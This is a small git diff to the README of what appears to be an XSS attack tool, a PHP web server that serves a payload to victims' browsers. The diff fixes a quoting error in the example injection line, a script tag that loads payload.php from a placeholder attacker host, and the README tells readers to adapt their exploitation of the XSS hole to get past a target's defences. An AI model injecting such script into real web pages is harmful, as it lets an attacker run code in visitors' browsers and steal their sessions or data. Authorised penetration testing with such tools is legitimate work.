@@ -3,7 +3,7 @@ A PHP web server that provides a payload delivered by XSS. Once the script is tr
 
 You can deliver the payload with the following example exploit (change your exploitation of the XSS vulnerability - different servers try to mitigate XSS in different ways):
 ```
-<script src="https://<attack_server_hostname>/payload.php></script>
+<script src="https://<attack_server_hostname>/payload.php"></script>
 ```
 ## Building and launching with Docker
 ```
